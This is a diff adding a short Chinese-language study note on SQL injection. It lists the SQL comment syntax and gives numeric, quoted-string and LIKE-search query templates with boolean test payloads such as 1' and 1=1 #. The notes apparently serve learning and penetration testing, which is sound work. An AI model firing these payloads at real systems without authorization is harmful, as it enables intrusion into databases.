@@ -1,0 +1,30 @@
+
+SQL语句中注释：
+1. #
+2. -- （注意空格）
+#############################
+
+----------
+数字型： 
+----------
+  输入数据类型为数字。
+  一般出现在弱类型语言中，会自动进行类型转换；强类型语言，如果类型不一致会报错。
+SELECT * FROM users WHERE id=$id     
+        @ 1'
+        @ 1 and 1=1; 
+        @ 1 and 1=2;
+        
+----------       
+字符型：
+----------
+  输入数据类型为字符。
+SELECT * FROM users WHERE id='$id' || SELECT * FROM users WHERE id="$id"
+        @ 1' and 1=1 #; 1' and 1=2 # （注：#是为了注释掉后面的'）
+        @ 1" and 1=1 #; 1" and 1=2 # （注：#是为了注释掉后面的"）
+        
+----------        
+搜索型：
+----------
+SELECT * FROM users WHERE id like '%$id%'; || SELECT * FROM users WHERE id like "%$id%";
+        @ xxx%' and 1=1 #; xxx%' and 1=2 #
+        @ xxx%" and 1=1 #; xxx%" and 1=2 #
